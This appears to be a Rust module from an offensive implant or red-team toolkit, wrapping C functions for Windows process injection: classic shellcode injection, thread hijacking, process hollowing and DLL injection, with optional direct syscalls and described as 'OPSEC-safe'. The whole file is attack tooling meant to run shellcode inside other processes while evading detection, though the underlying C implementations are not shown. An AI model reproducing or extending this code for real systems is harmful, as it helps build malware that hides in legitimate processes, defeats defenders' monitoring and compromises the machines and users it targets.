//! Process injection — classic, thread hijack, process hollowing, DLL inject
//! C FFI implementations for OPSEC-safe injection

#[cfg(not(all(target_os = "windows", feature = "cffi")))]
pub fn classic_injection(_: u32, _: &[u8], _: bool) -> Result<String, String> {
    Err("injection: cffi disabled".into())
}
#[cfg(not(all(target_os = "windows", feature = "cffi")))]
pub fn thread_hijack(_: u32, _: u32, _: &[u8]) -> Result<String, String> {
    Err("injection: cffi disabled".into())
}
#[cfg(not(all(target_os = "windows", feature = "cffi")))]
pub fn process_hollow(_: &str, _: &[u8]) -> Result<String, String> {
    Err("injection: cffi disabled".into())
}
#[cfg(not(all(target_os = "windows", feature = "cffi")))]
pub fn dll_injection(_: u32, _: &str, _: bool) -> Result<String, String> {
    Err("injection: cffi disabled".into())
}

#[cfg(all(target_os = "windows", feature = "cffi"))]
extern "C" {
    fn inject_classic(pid: u32, shellcode: *const u8, shellcode_size: usize, use_syscalls: i32) -> i32;
    fn inject_thread_hijack(pid: u32, tid: u32, shellcode: *const u8, shellcode_size: usize) -> i32;
    fn inject_process_hollow(target_exe: *const u16, shellcode: *const u8, shellcode_size: usize) -> i32;
    fn inject_dll(pid: u32, dll_path: *const u16, use_syscalls: i32) -> i32;
}

#[cfg(all(target_os = "windows", feature = "cffi"))]
pub fn classic_injection(pid: u32, shellcode: &[u8], use_syscalls: bool) -> Result<String, String> {
    let r = unsafe { inject_classic(pid, shellcode.as_ptr(), shellcode.len(), if use_syscalls { 1 } else { 0 }) };
    if r == 0 { Ok(format!("injected {}b into PID {}", shellcode.len(), pid)) }
    else { Err(format!("injection failed: {}", r)) }
}

#[cfg(all(target_os = "windows", feature = "cffi"))]
pub fn thread_hijack(pid: u32, tid: u32, shellcode: &[u8]) -> Result<String, String> {
    let r = unsafe { inject_thread_hijack(pid, tid, shellcode.as_ptr(), shellcode.len()) };
    if r == 0 { Ok(format!("hijacked TID {} in PID {}", tid, pid)) }
    else { Err(format!("hijack failed: {}", r)) }
}

#[cfg(all(target_os = "windows", feature = "cffi"))]
pub fn process_hollow(target: &str, shellcode: &[u8]) -> Result<String, String> {
    let tw: Vec<u16> = target.encode_utf16().chain(std::iter::once(0)).collect();
    let r = unsafe { inject_process_hollow(tw.as_ptr(), shellcode.as_ptr(), shellcode.len()) };
    if r == 0 { Ok(format!("hollowed {}", target)) }
    else { Err(format!("hollow failed: {}", r)) }
}

#[cfg(all(target_os = "windows", feature = "cffi"))]
pub fn dll_injection(pid: u32, dll_path: &str, use_syscalls: bool) -> Result<String, String> {
    // Wide-char conversion with null terminator — required by LoadLibraryW path
    let pw: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0)).collect();
    let r = unsafe { inject_dll(pid, pw.as_ptr(), if use_syscalls { 1 } else { 0 }) };
    if r == 0 { Ok(format!("injected DLL '{}' into PID {}", dll_path, pid)) }
    else { Err(format!("dll injection failed: {}", r)) }
}
